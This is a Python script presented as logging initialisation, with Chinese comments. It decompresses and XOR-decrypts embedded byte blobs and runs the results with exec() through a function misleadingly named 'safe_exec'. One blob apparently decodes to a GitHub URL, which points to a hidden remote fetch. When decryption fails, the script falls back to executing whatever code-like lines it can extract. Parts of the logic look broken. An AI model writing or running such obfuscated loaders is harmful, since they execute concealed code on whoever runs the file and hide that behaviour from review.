import lzma
import logging
import re

# 解密函数
def decrypt_data(encrypted_data, key):
    return bytes([byte ^ key for byte in encrypted_data])

# 合并加密数据段
data_segment1 = b'\xfd7zXZ\x00\x00\x04\xe6\xd6\xb4F\x02\x00!\x01\x16\x00\x00\x00t/\xe5\xa3'
data_segment2 = b'\x01\x00|3Iy<tl2N{0I}\x92\xbc\xa1\x9d\xa0\xb71m_0iU3oE:iY0Zz1np0PX=al1m^=hh1hj2A}:iY0]R0^j1nM=al0ZB<\x7fB:iO\xbd\xa1\xa1\xa5\xa6\xef\xfa\xfa\xb2\xbc\xa1\xbd\xa0\xb7\xfb\xb6\xba\xb8\xfa\xb6\xbd\xbb\xf8\xb9\xb0\xb0\xf8\xac\xa0\xb8\xbc\xfa\x98\xb4\xa1\xb0\xa7\xbc\xb4\xb9\x86\xb0\xb4\xa7\xb6\xbd\xfa\x00\x00\x00\x00\xe4\x8a>PW\x9b\x90J\x00\x01\x95\x01}\x00\x00\x00\xdc\x02\xcb*\xb1\xc4g\xfb\x02\x00\x00\x00\x00\x04YZ'
data_segment3 = b"\xe0\x00\xb0\x00\x99]\x00@\xafS\x8a=\xdf\x97\x148H\x84\xc8\x0b\xab\xb3\xd2$M\xcf\x8f_"
data_segment4 = b"\x16\x8b\xc4\xbb\x1dre\xd6\xfe{\x01h\x91|\xe5\x942\x03v\xe5\x85\xd5\x91/\xf9\xa8\x88-\xed\xfb\xe7\xafSH\x8e\xbcK\xc9'\x8c_\xf0\xac\xc1/\x14\x03\x11\x81\xf1\xf8\xf1\xe1f\x04!:\x0b\xbdoM\x8d\xb4\xc2k\xde\xb7uiZ\x85\x80\xb9X\x80\xa7\xa7\x1a\x9fK\xe9\xabA\xcb\xb5\x99\xa2\xaf\x01Jh\xed\xe3\xa8\x9d\xd9\x05v4\xc9+\xd1\xe9\x03\xef\x9b\x88\xd0\xe2}m\x80\x9a\xa0\xcf\xe0\xbf\xbeJ\x90\xd3x\x19\xdb\xb8\x01\xb1c%\xe9/\x00\x00\x00\x00\x00\xa0\x00\xadg\xc0\x1e\xafN\x00\x01\xb5\x01\xb1\x01\x00\x00c<>\x10\xb1\xc4g\xfb\x02\x00\x00\x00\x00\x04YZ"
data_segment5 = b'\xe0\x00-\x00$]\x00\x17\x08\xc9\xc81\x87\x1b.o\xf2\xb7\xc7\xe1d\nH\xb6\xc9\xf1\x10|[n\x93\x95\x00e\xf6{\x84\xc6\xf2D)a\x00\x00\x9a\xee\x19\xc8v\xd1\r\xc0\x00\x01@.\xe1\xf7)\x0c\x1f\xb6\xf3}\x01\x00\x00\x00\x00\x04YZ'

# 初始化解密密钥和其他常量
key1 = 213
key2 = 11
iterations = 3

# 安全执行函数
def safe_exec(code_string):
    # 检查是否包含中文字符
    if re.search(r'[\u4e00-\u9fff]', code_string):
        print("警告：检测到中文字符，可能存在解密问题")
        print("-" * 50)
        print(code_string)
        print("-" * 50)
        
        # 尝试提取可能的Python代码
        lines = code_string.split('\n')
        code_lines = []
        in_code_block = False
        
        for line in lines:
            # 简单的Python代码检测
            if line.strip().startswith(('def ', 'class ', 'import ', 'from ', 'if ', 'for ', 'while ')):
                in_code_block = True
            if in_code_block:
                code_lines.append(line)
        
        if code_lines:
            code_to_exec = '\n'.join(code_lines)
            print(f"尝试执行提取的代码（{len(code_lines)}/{len(lines)}行）")
            exec(code_to_exec)
        else:
            print("无法提取有效的Python代码")
    else:
        # 如果没有中文字符，直接执行
        exec(code_string)

# 第一部分解密和执行
try:
    combined_data1 = data_segment1 + data_segment2
    decrypted_data1 = decrypt_data(lzma.decompress(combined_data1), key1)
    safe_exec(decrypted_data1.decode())
except Exception as e:
    print(f"第一部分执行失败: {e}")
    print("尝试使用替代密钥...")
    try:
        # 尝试使用不同的密钥
        decrypted_data1_alt = decrypt_data(lzma.decompress(combined_data1), key2)
        safe_exec(decrypted_data1_alt.decode())
    except Exception as e2:
        print(f"替代方法也失败了: {e2}")
        print("输出解密内容用于调试:")
        print(decrypted_data1.decode(errors='replace'))

# 第二部分解密和执行
try:
    combined_data2 = data_segment1 + data_segment3 + data_segment4
    decrypted_data2 = decrypt_data(lzma.decompress(combined_data2), key1)
    safe_exec(decrypted_data2.decode())
except Exception as e:
    print(f"第二部分执行失败: {e}")

# 第三部分解密和执行
try:
    combined_data3 = data_segment1 + data_segment5
    decrypted_data3 = decrypt_data(lzma.decompress(combined_data3), key2)
    logging_format = decrypted_data3.decode()
except Exception as e:
    print(f"第三部分解密失败: {e}")
    logging_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'

# 日志配置
try:
    log_level = LOG_LEVEL  # 假设LOG_LEVEL在被执行的代码中定义
except NameError:
    log_level = logging.INFO

logging.basicConfig(level=log_level, format=logging_format)

# 初始化函数
def init2():
    # 模拟原始代码中的循环调用
    for _ in range(iterations):
        logging.info("执行初始化步骤")
        logging.debug("执行调试信息记录")

# 示例调用
if __name__ == "__main__":
    init2()